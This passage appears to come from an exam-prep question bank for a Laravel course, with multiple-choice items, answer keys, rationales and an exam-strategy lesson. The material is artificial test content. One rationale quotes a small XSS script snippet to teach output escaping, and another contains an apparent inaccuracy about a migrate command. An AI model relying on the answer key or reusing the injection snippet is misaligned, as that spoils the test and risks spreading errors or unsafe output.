locale.","bloom":"apply","source":"localization.pptx slides 1–11; laravel-localization.docx"},{"id":"laravel-mcp-implementation-q-01","type":"MCQ","topic":"Laravel MCP Implementation","marks":1,"question":"After installing `laravel/mcp`, which Artisan command scaffolds a new MCP server class?","choices":["php artisan make:controller McpController --mcp","php artisan make:mcp-server TodoServer","php artisan mcp:create server TodoServer","php artisan vendor:publish --tag=mcp-server"],"correct":1,"rationale":"`php artisan make:mcp-server TodoServer` is the generator provided by the `laravel/mcp` package. It creates a server class that registers tools, handles `tools/list` requests, and routes `tools/call` invocations. Option A (`make:controller --mcp`) is invented — the `--mcp` flag does not exist on `make:controller`; MCP servers are not plain HTTP controllers. Option C reverses the colon-separated namespace incorrectly; the command is `make:mcp-server`, not `mcp:create server`. Option D (`vendor:publish --tag=mcp-server`) publishes config/stubs, not generates runtime classes; it is a one-time setup step, not a code generator.","bloom":"remember","source":"laravel_mcp.pptx slides 1–12"},{"id":"laravel-mvc-blade-q-01","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"In Laravel's MVC architecture, which directory contains the Controller files?","choices":["resources/controllers/","app/Http/Controllers/","app/Controllers/","routes/controllers/"],"correct":1,"rationale":"Controllers live in `app/Http/Controllers/` — that is the directory Laravel's autoloader and `make:controller` both target. Option A (`resources/controllers/`) is wrong because `resources/` holds views, language files, and front-end assets, not PHP classes. Option C (`app/Controllers/`) is a plausible guess but Laravel's default namespace is `App\\Http\\Controllers`, which maps to `app/Http/Controllers/`. Option D (`routes/controllers/`) confuses routing files with controller classes — routes live in `routes/`, controllers do not.","bloom":"remember","source":"intro_to_laravel.pptx slides 3–5","tags":["pretest"]},{"id":"laravel-mvc-blade-q-02","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"A Blade template outputs a user-supplied comment with `{!! $comment !!}`. What security risk does this introduce?","choices":["SQL injection, because Blade does not escape database queries","CSRF, because unescaped output bypasses the CSRF token check","Cross-site scripting (XSS), because raw HTML output lets attackers inject executable scripts","Directory traversal, because the double-brace escaping is skipped"],"correct":2,"rationale":"`{!! $var !!}` outputs raw, unescaped HTML. If `$comment` contains `\u003cscript\u003edocument.cookie='...'\u003c/script\u003e`, that script executes in every visitor's browser — the definition of XSS. Option A (SQL injection) is unrelated to Blade's output syntax; SQL injection occurs when user input reaches a raw database query without parameterization. Option B (CSRF) is also unrelated; CSRF protection depends on the `@csrf` token in forms, not on output escaping. Option D (directory traversal) has nothing to do with the `{!! !!}` syntax — directory traversal is a file-path exploit. The safe alternative is `{{ $comment }}`, which HTML-encodes the value before output.","bloom":"understand","source":"intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection"},{"id":"laravel-mvc-blade-q-03","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"Which Blade @-directive marks the injection point in a parent layout where child templates insert their content?","choices":["@section('content')","@extends('layouts.master')","@yield('content')","@include('partials.header')"],"correct":2,"rationale":"`@yield('content')` is placed in the parent layout and acts as a placeholder — it tells Blade where to insert the named section from the child template. `@section('content')` (option A) is the child-side directive that *defines* the block to inject; it is not the placeholder in the parent. `@extends('layouts.master')` (option B) tells a child which parent to use; it has no role in the parent file. `@include('partials.header')` (option D) embeds a partial view inline and is unrelated to the yield/section inheritance mechanism.","bloom":"remember","source":"intro_to_laravel.pptx slides 16–19"},{"id":"laravel-mvc-blade-q-04","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"A Blade template has `@foreach($products as $p)` but is missing the closing directive. What is the result?","choices":["Laravel silently ignores the open directive and outputs nothing","PHP processes it as a raw foreach loop and continues normally","Blade fails to compile the template and throws a parse error","The loop runs once for the first element and then stops"],"correct":2,"rationale":"Every Blade opening @-directive requires a matching closing counterpart. `@foreach` must be paired with `@endforeach`. When the closing directive is absent, Blade's compiler cannot determine where the loop ends and throws a parse error — the template never renders. Option A is incorrect; Blade does not silently skip unclosed directives. Option B is incorrect; Blade is compiled to PHP, but the compilation step fails before any PHP execution occurs. Option D is a fabricated behavior that does not exist — Blade's parser rejects the malformed template entirely.","bloom":"understand","source":"intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures"},{"id":"laravel-mvc-blade-q-05","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"In the Blade component system, which tag wraps content and maps to `resources/views/components/master.blade.php`?","choices":["\u003cblade-master\u003e","\u003ccomponent name='master'\u003e","\u003cx-master\u003e","@component('master')"],"correct":2,"rationale":"Blade components use the `x-` prefix convention. `\u003cx-master\u003e` automatically resolves to `resources/views/components/master.blade.php`. Option A (`\u003cblade-master\u003e`) is not valid Blade syntax. Option B (`\u003ccomponent name='master'\u003e`) is not how Blade components are invoked — there is no such element tag syntax in Laravel Blade. Option D (`@component('master')`) is the older Blade component syntax from early Laravel versions and does not map to the `resources/views/components/` directory used by the current anonymous-component system.","bloom":"understand","source":"TIDBITS-components_config_db_SCRIPT.docx §Blade Components"},{"id":"laravel-mvc-blade-q-06","type":"MCQ","topic":"MVC + Blade templating","marks":1,"question":"A controller returns `view('students.index', ['students' =\u003e $list])`. In which directory does Laravel look for the template file?","choices":["app/Views/students/index.blade.php","resources/views/students/index.blade.php","public/views/students/index.blade.php","storage/views/students/index.blade.php"],"correct":1,"rationale":"Laravel resolves view dot-notation paths relative to `resources/views/`. The name `students.index` maps to `resources/views/students/index.blade.php`. Option A (`app/Views/`) is incorrect; view files are never stored under `app/` — that directory holds PHP classes (Models, Controllers, Middleware). Option C (`public/views/`) is where publicly accessible static assets live; Blade templates are server-side files and never belong there. Option D (`storage/views/`) is where Blade *compiles* cached views, not where the source templates are stored.","bloom":"apply","source":"intro_to_laravel.pptx slides 3–5; intro_to_laravel_SCRIPT.docx §Creating your own blade template"},{"id":"laravel-routing-controllers-q-01","type":"MCQ","topic":"Routes and Resource Controllers","marks":1,"question":"You use `Route::apiResource('invoices', InvoiceController::class)`. How many routes does Laravel register, and which two controller methods are intentionally omitted compared to `Route::resource()`?","choices":["7 routes; none are omitted — apiResource is identical to resource","5 routes; `create` and `edit` are omitted because JSON APIs do not serve HTML forms","5 routes; `store` and `destroy` are omitted to prevent unauthorized writes","3 routes; only `index`, `show`, and `store` are registered"],"correct":1,"rationale":"`Route::apiResource()` registers 5 routes: index, store, show, update, and destroy. It omits `create` and `edit` because those methods return HTML forms for creating or editing records — irrelevant for a JSON API where the client handles its own UI. Option A is incorrect: `resource()` registers 7 routes while `apiResource()` registers 5. Option C is wrong about which methods are omitted; `store` and `destroy` are included in apiResource — they handle creating and deleting records. Option D (3 routes) is not correct for either resource macro.","bloom":"understand","source":"laravel_with_sqlite_API_SCRIPT.docx; intro_to_laravel_SCRIPT.docx"},{"id":"laravel-routing-controllers-q-02","type":"MCQ","topic":"Routes and Resource Controllers","marks":1,"question":"After adding a new route to `routes/api.php`, a developer hits that path and gets a 404. No typos in the URL. What is the most likely fix?","choices":["Restart the database because route registration requires a fresh connection","Run `php artisan route:clear` to remove the stale route cache","Add `-\u003ename()` to the route definition so Laravel can find it","Move the route to `routes/web.php` so the framework picks it up"],"correct":1,"rationale":"Laravel caches routes to a single file for performance. If you added a route after caching, the new route is invisible until you clear the cache with `php artisan route:clear`. This is the most common cause of 'route not found' bugs right after adding a new declaration. Option A (restarting the database) has no effect on route resolution — routes are PHP files, not database records. Option C (adding `-\u003ename()`) assigns a named alias and has nothing to do with whether the route is registered at all. Option D (moving to `web.php`) would change the middleware group; it would not fix a caching issue, and API routes belong in `api.php`.","bloom":"apply","source":"laravel_with_sqlite_API_SCRIPT.docx"},{"id":"mcp-protocol-q-01","type":"MCQ","topic":"Model Context Protocol","marks":1,"question":"Which organization created Model Context Protocol?","choices":["OpenAI","Meta","Google","Anthropic"],"correct":3,"rationale":"Anthropic created and maintains Model Context Protocol as an open standard for connecting AI models to external tools, resources, and data sources. This is tested verbatim in past-exam Q4. Option A (OpenAI) is the creator of the GPT model family and the function-calling API, not MCP. Option B (Meta) develops the LLaMA model family; MCP is not their protocol. Option C (Google) provides Gemini and Vertex AI; MCP was designed by Anthropic independent of Google's offerings.","bloom":"remember","source":"laravel_mcp.pptx slides 1–10; final-practice.docx Q4"},{"id":"mcp-protocol-q-02","type":"MCQ","topic":"Model Context Protocol","marks":1,"question":"An MCP server exposes a `GET /summaries/weekly` endpoint that returns pre-computed data for the AI to read. Which MCP primitive does this represent?","choices":["Tools (MCP) — because the AI invokes an endpoint","Prompts (MCP) — because it returns formatted text","Resources (MCP) — because it exposes a data source","Bindings (MCP) — because it connects to external data"],"correct":2,"rationale":"Resources (MCP) are data sources the AI loads into context — files, database queries, or data endpoints. A read-only summary endpoint that returns data for the AI to consume is a Resource. Option A (Tools) is incorrect: Tools are executable actions with potential side effects, such as creating a record or running a script. The endpoint described is read-only with no side effects. Option B (Prompts) is also incorrect: Prompts are reusable LLM interaction templates — structured input to the model, not data returned by an endpoint. Option D (Bindings) is an Azure Functions concept, not an MCP primitive — the three MCP primitives are Tools, Resources, and Prompts only.","bloom":"understand","source":"laravel_mcp.pptx slides 1–10; final-practice.docx Q3"},{"id":"migrations-and-seeders-q-01","type":"MCQ","topic":"Migrations and Seeders","marks":1,"question":"In a Laravel migration, which method defines the table structure to be created, and which method reverses that change?","choices":["create() and drop()","up() and down()","migrate() and rollback()","build() and destroy()"],"correct":1,"rationale":"Every Laravel migration class has two methods: `up()` defines what to build (typically calls `Schema::create()`), and `down()` defines how to reverse it (typically calls `Schema::dropIfExists()`). Option A (create and drop) names the Schema helper methods called *inside* `up()` and `down()`, not the migration methods themselves. Option C (migrate and rollback) are Artisan commands you run, not PHP method names inside the migration class. Option D (build and destroy) do not exist in Laravel's migration API.","bloom":"remember","source":"laravel_with_students_MySQL_SCRIPT.docx"},{"id":"migrations-and-seeders-q-02","type":"MCQ","topic":"Migrations and Seeders","marks":1,"question":"You want to drop all tables, re-run every migration, and then run all seeders in a single command. Which command does this?","choices":["php artisan migrate --fresh","php artisan migrate:refresh --seed","php artisan db:seed --refresh","php artisan migrate:reset && php artisan db:seed"],"correct":1,"rationale":"`php artisan migrate:refresh --seed` rolls back every migration (dropping all tables), re-runs them in timestamp order to rebuild the schema, and then executes the `DatabaseSeeder`. This is the single-command development reset. Option A (`migrate --fresh`) is a real command that uses `DROP TABLE` instead of rolling back, but the `--fresh` flag on `migrate` is not the same as `migrate:refresh` — and it does not include seeding. Option C (`db:seed --refresh`) is not a valid flag; `db:seed` accepts `--class` but not `--refresh`. Option D chains two separate commands, which achieves a similar outcome but is not the single-command shortcut taught in the course.","bloom":"remember","source":"laravel_with_students_MySQL_SCRIPT.docx; laravel_with_sqlite_API_SCRIPT.docx"},{"id":"model-relationships-q-01","type":"MCQ","topic":"Eloquent Model Relationships","marks":1,"question":"A `Post` model can have many `Comment` records. Which method declaration correctly defines the one-to-many relationship on the `Post` model?","choices":["public function comment() { return $this-\u003ehasMany(Comment::class); }","public function comments() { return $this-\u003ehasMany(Comment::class); }","public function comments() { return $this-\u003ebelongsTo(Comment::class); }","public function comments() { return $this-\u003ehasOne(Comment::class); }"],"correct":1,"rationale":"The parent side of a one-to-many relationship uses `hasMany()`. The method name is conventionally plural (`comments`) because it returns a collection, not a single model. Option A uses the singular name `comment()` — not technically wrong in PHP, but it violates the convention that tells other developers (and `belongsTo` inference) which side of the relationship they are on. Option C uses `belongsTo()`, which is the *child* side declaration — it would go on `Comment`, not on `Post`. Option D uses `hasOne()`, which is correct only for a one-to-one relationship where `Post` owns exactly one `Comment`.","bloom":"understand","source":"auth-with-breeze_SQLite_SCRIPT.docx; laravel_with_students_MySQL_SCRIPT.docx"},{"id":"model-relationships-q-02","type":"MCQ","topic":"Eloquent Model Relationships","marks":1,"question":"Given `hasMany(Org::class)` declared on `User`, which of the following queries fetches only the current user's orgs using the relationship?","choices":["Org::where('user_id', Auth::id())-\u003eget()","Auth::user()-\u003eorgs()-\u003elatest('updated_at')-\u003eget()","Org::all()-\u003efilter(fn($o) =\u003e $o-\u003euser_id == Auth::id())","Auth::user()-\u003eorg()-\u003elatest('updated_at')-\u003eget()"],"correct":1,"rationale":"`Auth::user()-\u003eorgs()` traverses the `hasMany` relationship from the authenticated user model and returns a query builder scoped to that user's orgs. Chaining `-\u003elatest('updated_at')-\u003eget()` sorts and executes it. Option A is a manual foreign-key query — it works but bypasses the declared relationship, negating the purpose of defining `hasMany`. Option C fetches every org into memory first then filters in PHP — this is the `all()-\u003ewhere()` anti-pattern applied to collections. Option D uses the singular `-\u003eorg()` instead of `-\u003eorgs()`; the method name must match what was declared on the User model (`orgs()`).","bloom":"apply","source":"auth-with-breeze_SQLite_SCRIPT.docx"},{"id":"model-relationships-q-03","type":"MCQ","topic":"Eloquent Model Relationships","marks":1,"question":"An `Org` model has `belongsTo(User::class)`. What column does Eloquent expect to find in the `orgs` table by default?","choices":["owner_id","user_id","org_user","user_key"],"correct":1,"rationale":"Eloquent infers the foreign key name by taking the related model name (`User`), converting it to snake_case, and appending `_id`. For `belongsTo(User::class)`, the expected column is `user_id`. If your migration used a different column name, you must pass it explicitly as the second argument to `belongsTo()`. Option A (`owner_id`) is a plausible custom name but is not the convention Eloquent uses. Option C (`org_user`) reverses the tables and does not follow the `{model}_id` convention. Option D (`user_key`) is a fabricated name with no basis in Eloquent's convention.","bloom":"understand","source":"auth-with-breeze_SQLite_SCRIPT.docx; laravel_with_students_MySQL_SCRIPT.docx"},{"id":"query-builder-and-raw-sql-q-01","type":"MCQ","topic":"Query Builder and Raw SQL","marks":1,"question":"Which Query Builder chain correctly selects `name` and `email` from the `users` table where `active` is not null, ordered by `name`?","choices":["DB::table('users')-\u003eselect(['name', 'email'])-\u003ewhereNotNull('active')-\u003eorderBy('name')-\u003eget()","DB::select('users')-\u003ewhere('active', '!=', null)-\u003eorderBy('name')-\u003eget()","DB::table('users')-\u003eselect(['name', 'email'])-\u003ewhereNotNull('active')-\u003eorderBy('name')","User::table('users')-\u003eselect(['name', 'email'])-\u003ewhereNotNull('active')-\u003eget()"],"correct":0,"rationale":"The correct Query Builder chain starts with `DB::table('table_name')`, chains fluent methods, and terminates with `-\u003eget()` to execute and return results. Option B misuses `DB::select()` — that method takes a raw SQL string, not a table name, and does not support fluent chaining. Option C is identical to the correct answer except it omits `-\u003eget()` at the end; without it, the chain returns a Builder object, not a result set. Option D calls `User::table('users')` — `table()` is a `DB` facade method, not a model static method; calling it on a model class is a runtime error.","bloom":"apply","source":"TIDBITS-components_config_db_SCRIPT.docx"},{"id":"query-builder-and-raw-sql-q-02","type":"MCQ","topic":"Query Builder and Raw SQL","marks":1,"question":"What does `DB::select('SELECT * FROM students WHERE School = ?', ['Mining'])` return?","choices":["An Eloquent Collection of Student model instances","A single Student model instance","An array of stdClass objects","A Builder object that requires -\u003eget() to execute"],"correct":2,"rationale":"`DB::select()` executes a raw SQL query and returns a plain PHP array of `stdClass` objects — one per row. Unlike Eloquent, there is no model wrapping; properties are accessed as `$row-\u003eSchool`, not as model methods. Option A (Eloquent Collection) is what Eloquent model queries return; raw SQL bypasses the ORM entirely. Option B (single model instance) is what `findOrFail()` returns for a single record, not raw SQL. Option D (Builder object) describes what you get from an un-terminated Query Builder chain (missing `-\u003eget()`); `DB::select()` is not a Query Builder call and executes immediately.","bloom":"understand","source":"TIDBITS-components_config_db_SCRIPT.docx"},{"id":"rest-api-design-q-01","type":"MCQ","topic":"REST API Design","marks":1,"question":"A `store()` controller method successfully creates a new resource. Which HTTP status code and `response()-\u003ejson()` call correctly signals creation to the client?","choices":["return response()-\u003ejson($resource);","return response()-\u003ejson($resource, 200);","return response()-\u003ejson($resource, 201);","return response()-\u003ejson($resource, 204);"],"correct":2,"rationale":"HTTP 201 Created is the correct status code when a new resource has been persisted. It is passed as the second argument to `response()-\u003ejson()`. Option A omits the status code — the default is 200 OK, which means 'the request succeeded and here is a representation,' not 'a new resource was created.' Option B explicitly sends 200, same issue. Option D sends 204 No Content — that is correct for successful deletes or updates where no body is returned, not for a newly created resource that the client needs to reference.","bloom":"apply","source":"laravel_with_sqlite_API_SCRIPT.docx"},{"id":"rest-api-design-q-02","type":"MCQ","topic":"REST API Design","marks":1,"question":"Which file should contain `Route::apiResource('products', ProductController::class)` for a JSON API?","choices":["routes/web.php","routes/api.php","app/Http/Controllers/ProductController.php","config/routes.php"],"correct":1,"rationale":"`routes/api.php` is for stateless API routes — it applies no session middleware, returns JSON by default, and prefixes all URLs with `/api/`. `Route::apiResource()` belongs here. Option A (`routes/web.php`) is for browser-facing routes that carry sessions, CSRF protection, and cookie-based authentication — appropriate for Blade apps, not JSON APIs. Option C is a controller file, not a route file; you never define routes inside controller classes. Option D (`config/routes.php`) does not exist in Laravel — route configuration is not part of the `config/` directory.","bloom":"understand","source":"laravel_with_sqlite_API_SCRIPT.docx"},{"id":"rest-api-design-q-03","type":"MCQ","topic":"REST API Design","marks":1,"question":"A `store()` method calls `$request-\u003evalidate(['name' =\u003e 'required'])` and the `name` field is missing. What does Laravel return automatically?","choices":["A 500 Internal Server Error with a stack trace","A 404 Not Found response","A 422 Unprocessable Entity response with a JSON error body","A 200 OK response with a null body"],"correct":2,"rationale":"When `$request-\u003evalidate()` finds a failed rule in an API context, Laravel automatically returns a 422 Unprocessable Entity response with a JSON body listing each field's validation errors. Execution stops before reaching `Student::create()`. Option A (500) is a server error indicating a crash — validation failure is not a crash, it is an expected control flow. Option B (404) means 'resource not found' — it has nothing to do with request body validation. Option D (200 with null) would mean the request succeeded, which is incorrect when validation fails.","bloom":"understand","source":"laravel_with_sqlite_API_SCRIPT.docx"},{"id":"session-auth-breeze-q-01","type":"MCQ","topic":"Session Authentication with Breeze","marks":1,"question":"Which CSS framework does Laravel Breeze use for its scaffolded views?","choices":["Bootstrap","Bulma","Foundation","Tailwind CSS"],"correct":3,"rationale":"Laravel Breeze scaffolds all its authentication views using Tailwind CSS utility classes. The course materials explicitly distinguish Breeze (Tailwind) from `laravel/ui` (Bootstrap). Option A (Bootstrap) is the framework used by `laravel/ui` — the older authentication scaffolding package that Breeze replaced. Confusing Bootstrap with Breeze is a documented exam error. Option B (Bulma) and Option C (Foundation) are real CSS frameworks but are never used by Laravel Breeze; they are plausible-sounding distractors for a student who cannot recall the correct name.","bloom":"remember","source":"auth-with-breeze_SQLite_SCRIPT.docx"},{"id":"session-auth-breeze-q-02","type":"MCQ","topic":"Session Authentication with Breeze","marks":1,"question":"Inside a controller protected by the `auth` middleware, which call returns the authenticated user's primary key as an integer?","choices":["Auth::user()-\u003eprimary()","Auth::id()","session('user_id')","request()-\u003euserId()"],"correct":1,"rationale":"`Auth::id()` is the facade call that returns the authenticated user's integer primary key directly. It is equivalent to `Auth::user()-\u003eid` but more concise. Option A (`Auth::user()-\u003eprimary()`) is invented — `primary()` is not a method on the User model. Option C (`session('user_id')`) reads a raw session key — while Breeze does store the user ID in the session, reading it directly is not the correct idiomatic pattern; `Auth::id()` is the authoritative call. Option D (`request()-\u003euserId()`) does not exist — `request()` provides access to the HTTP request object, not authentication state.","bloom":"remember","source":"auth-with-breeze_SQLite_SCRIPT.docx"},{"id":"swagger-openapi-q-01","type":"MCQ","topic":"Swagger and OpenAPI","marks":1,"question":"A developer says 'I documented my API in Swagger.' What is the precise technical correction?","choices":["The documentation format is called REST — Swagger is only the editor","The specification language is OpenAPI; Swagger is the toolset (UI, Editor, Codegen) that reads it","Swagger and OpenAPI are identical terms and the statement is correct","OpenAPI is a product sold by SmartBear; Swagger is the open standard"],"correct":1,"rationale":"OpenAPI is the specification language — a YAML or JSON contract describing an API's paths, parameters, and schemas. Swagger is the toolset built around that spec: Swagger UI renders interactive docs, Swagger Editor lets you write and validate specs, and Swagger Codegen generates client libraries. This distinction is directly tested in past-exam Q8. Option A is incorrect — REST describes an architectural style, not a documentation format, and is unrelated to the spec-vs-toolset distinction. Option C is explicitly wrong — OpenAPI and Swagger are distinct concepts. Option D reverses the reality: OpenAPI is the open standard (maintained by the Linux Foundation), and Swagger refers to SmartBear's toolset.","bloom":"understand","source":"swagger-with-laravel.pptx; final-practice.docx Q8","tags":["pretest"]},{"id":"swagger-openapi-q-02","type":"MCQ","topic":"Swagger and OpenAPI","marks":1,"question":"After adding a new `@OA\\Post` annotation to a controller, a developer refreshes `/api/documentation` but sees no change. What is the missing step?","choices":["Restart the Laravel dev server to reload PHP classes","Run `php artisan l5-swagger:generate` to recompile the OpenAPI document","Clear the route cache with `php artisan route:clear`","Publish the l5-swagger config again with `vendor:publish`"],"correct":1,"rationale":"`php artisan l5-swagger:generate` is the compile step that reads all `@OA\\` annotations in the project and writes a fresh OpenAPI JSON document. Swagger UI at `/api/documentation` serves that compiled JSON — it does not read annotations directly. Without regenerating, the UI shows the previous state. Option A (restarting the server) reloads PHP but does not trigger annotation compilation; the stale JSON document is still served. Option C (route cache) is unrelated to documentation generation. Option D (`vendor:publish`) copies config files from the package — a one-time setup step, not a documentation regeneration step.","bloom":"apply","source":"swagger-with-laravel.pptx; Laravel_L5Swagger_SCRIPT_2026.docx"},{"id":"swagger-openapi-q-03","type":"MCQ","topic":"Swagger and OpenAPI","marks":1,"question":"The `@OA\\Info` annotation must appear exactly once in a Laravel project. Where is the correct location for it?","choices":["Directly above the `routes/api.php` file's first Route declaration","In a dedicated `swagger.php` config file under `config/`","On the abstract base `Controller` class in `app/Http/Controllers/Controller.php`","On each individual controller method that the API exposes"],"correct":2,"rationale":"`@OA\\Info` provides the top-level API metadata (title, version, description) required by the OpenAPI specification. It belongs on the abstract base `Controller` class because l5-swagger scans PHP files for annotations and the base controller is the single, shared ancestor of all controllers — placing it there ensures it appears exactly once. Option A (above a route definition) is incorrect; `routes/api.php` contains route declarations, not PHP classes, and l5-swagger does not scan route files for annotations. Option B (`config/swagger.php`) is also wrong — annotation-based docs are written in PHP files, not config files. Option D (on each controller method) would duplicate `@OA\\Info`, which is invalid — the OpenAPI spec allows only one Info object.","bloom":"understand","source":"swagger-with-laravel.pptx; Laravel_L5Swagger_SCRIPT_2026.docx"}]},"lessons":[{"n":0,"id":"COMP3975-exam-strategy","title":"Exam strategy and pitfalls — COMP 3975 Final","hook":"Time allocation, top pitfalls, when to skip.","tags":["strategy","exam-prep"],"module":"Exam prep","kind":"strategy","source":"Final Exam Outline.pdf; final-practice.docx; PHP_JWT.pptx slide 8; swagger-with-laravel.pptx slide 2; localization.pptx slides 3,6","blocks":[{"kind":"h2","html":"Exam format (from Final Exam Outline.pdf)","text":"Exam format (from Final Exam Outline.pdf)"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eDate\u003c/strong\u003e: April 23, 2026 · 10:30–11:30 AM (60 minutes)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e80 marks total\u003c/strong\u003e: 60 MCQ (1 mark each) + 10 match-two-columns (1 mark each) + 1 coding question (10 marks)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAllowed\u003c/strong\u003e: one handwritten cheat sheet, 8.5×11&quot;, both sides\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCoverage\u003c/strong\u003e: Weeks 7–13\u003c/li\u003e\n\u003c/ul\u003e","text":"- **Date**: April 23, 2026 · 10:30–11:30 AM (60 minutes)\n- **80 marks total**: 60 MCQ (1 mark each) + 10 match-two-columns (1 mark each) + 1 coding question (10 marks)\n- **Allowed**: one handwritten cheat sheet, 8.5×11\", both sides\n- **Coverage**: Weeks 7–13"},{"kind":"h2","html":"Time allocation","text":"Time allocation"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eSection\u003c/th\u003e\n\u003cth\u003eMarks\u003c/th\u003e\n\u003cth\u003eBudget\u003c/th\u003e\n\u003cth\u003ePer item\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eMCQ (60 Q)\u003c/td\u003e\n\u003ctd\u003e60\u003c/td\u003e\n\u003ctd\u003e28 min\u003c/td\u003e\n\u003ctd\u003e~28 sec\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMatch two columns (10 pairs)\u003c/td\u003e\n\u003ctd\u003e10\u003c/td\u003e\n\u003ctd\u003e8 min\u003c/td\u003e\n\u003ctd\u003e~48 sec\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCoding question\u003c/td\u003e\n\u003ctd\u003e10\u003c/td\u003e\n\u003ctd\u003e18 min\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eBuffer / review\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e6 min\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"You have less than 30 seconds per MCQ. Skip and mark if uncertain — return at the end.","text":"You have less than 30 seconds per MCQ. Skip and mark if uncertain — return at the end."},{"kind":"h2","html":"Question-type strategy","text":"Question-type strategy"},{"kind":"p","html":"\u003cstrong\u003eMCQ\u003c/strong\u003e: Read every choice before selecting. Many distractors use plausible-but-wrong command syntax (e.g. \u003ccode\u003emake-migration\u003c/code\u003e vs \u003ccode\u003emake:migration\u003c/code\u003e). If two choices look nearly identical, the difference is the answer.","text":"**MCQ**: Read every choice before selecting. Many distractors use plausible-but-wrong command syntax (e.g. `make-migration` vs `make:migration`). If two choices look nearly identical, the difference is the answer."},{"kind":"p","html":"\u003cstrong\u003eMatch two columns\u003c/strong\u003e: Fill in your surest matches first. Each correct match eliminates one distractor, making the remaining pairs easier.","text":"**Match two columns**: Fill in your surest matches first. Each correct match eliminates one distractor, making the remaining pairs easier."},{"kind":"p","html":"\u003cstrong\u003eCoding question\u003c/strong\u003e: Write the structure first (class name, method signature, key annotations or directives). Partial credit is likely. Even a skeleton with correct variable names scores better than a blank.","text":"**Coding question**: Write the structure first (class name, method signature, key annotations or directives). Partial credit is likely. Even a skeleton with correct variable names scores better than a blank."},{"kind":"h2","html":"When to skip and return","text":"When to skip and return"},{"kind":"p","html":"Skip if you can&#39;t answer in 20 seconds. Write the question number on a scratch corner. Return after finishing all other questions. Never leave MCQ blank — there&#39;s no penalty; guess from remaining choices.","text":"Skip if you can't answer in 20 seconds. Write the question number on a scratch corner. Return after finishing all other questions. Never leave MCQ blank — there's no penalty; guess from remaining choices."},{"kind":"h2","html":"Top 5 pitfalls (sourced from final-practice.docx)","text":"Top 5 pitfalls (sourced from final-practice.docx)"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eArtisan colon syntax\u003c/strong\u003e (final-practice.docx Q6). The command is \u003ccode\u003ephp artisan make:migration\u003c/code\u003e, not \u003ccode\u003ephp artisan migration\u003c/code\u003e, not \u003ccode\u003emake-migration\u003c/code\u003e, not \u003ccode\u003enew:migration\u003c/code\u003e. Artisan namespaces always use colons. Five of the six answer choices in Q6 are syntactically wrong in exactly this way.\u003c/p\u003e","text":"**Artisan colon syntax** (final-practice.docx Q6). The command is `php artisan make:migration`, not `php artisan migration`, not `make-migration`, not `new:migration`. Artisan namespaces always use colons. Five of the six answer choices in Q6 are syntactically wrong in exactly this way."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eLocalization directory\u003c/strong\u003e (final-practice.docx Q1). Translation files live in \u003ccode\u003eresources/lang/{locale}/\u003c/code\u003e. Common wrong answers place them in \u003ccode\u003eresources/views/lang\u003c/code\u003e, \u003ccode\u003estorage/lang\u003c/code\u003e, \u003ccode\u003eapp/lang\u003c/code\u003e, or \u003ccode\u003ebootstrap/lang\u003c/code\u003e. The \u003ccode\u003eresources/lang/\u003c/code\u003e path is the only correct one.\u003c/p\u003e","text":"**Localization directory** (final-practice.docx Q1). Translation files live in `resources/lang/{locale}/`. Common wrong answers place them in `resources/views/lang`, `storage/lang`, `app/lang`, or `bootstrap/lang`. The `resources/lang/` path is the only correct one."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e__()\u003c/code\u003e helper vs imposters\u003c/strong\u003e (final-practice.docx Q2). Laravel&#39;s translation helper is \u003ccode\u003e__(&#39;key&#39;)\u003c/code\u003e. The distractors — \u003ccode\u003etranslate()\u003c/code\u003e, \u003ccode\u003elang()\u003c/code\u003e, \u003ccode\u003ei18n()\u003c/code\u003e, \u003ccode\u003et()\u003c/code\u003e — look like valid internationalization helpers but none of them exist in Laravel. Only \u003ccode\u003e__()\u003c/code\u003e works.\u003c/p\u003e","text":"**`__()` helper vs imposters** (final-practice.docx Q2). Laravel's translation helper is `__('key')`. The distractors — `translate()`, `lang()`, `i18n()`, `t()` — look like valid internationalization helpers but none of them exist in Laravel. Only `__()` works."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eMCP creator\u003c/strong\u003e (final-practice.docx Q4). MCP (Model Context Protocol) was created by \u003cstrong\u003eAnthropic\u003c/strong\u003e, not OpenAI, Meta, Google, or Microsoft. The distractor &quot;OpenAI&quot; is the most common wrong pick.\u003c/p\u003e","text":"**MCP creator** (final-practice.docx Q4). MCP (Model Context Protocol) was created by **Anthropic**, not OpenAI, Meta, Google, or Microsoft. The distractor \"OpenAI\" is the most common wrong pick."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003cstrong\u003eEloquent \u003ccode\u003eall()\u003c/code\u003e vs method chaining\u003c/strong\u003e (final-practice.docx Q9). \u003ccode\u003eUser::all()\u003c/code\u003e retrieves every record. \u003ccode\u003eUser::get()\u003c/code\u003e retrieves the collection from a query builder — you do NOT chain 